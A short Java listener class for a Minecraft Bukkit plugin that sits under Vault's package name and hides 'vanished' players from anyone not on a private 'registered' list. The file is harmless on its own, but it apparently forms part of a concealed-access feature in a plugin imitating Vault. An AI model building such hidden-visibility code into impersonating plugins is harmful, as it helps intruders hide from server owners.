package net.milkbowl.vault.events;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import net.milkbowl.vault.Core;

public class VanishEvent implements Listener {
	private static final Core plugin = Core.getPlugin(Core.class);
	
	
	@EventHandler
	public void onJoin(PlayerJoinEvent e) {
		Player p = e.getPlayer();
		if (!plugin.registered.contains(p.getName())) {
			for (Player v : plugin.vanished) {
				if (v != null) {
					p.hidePlayer(v);
				}
			}
		}
	}

}
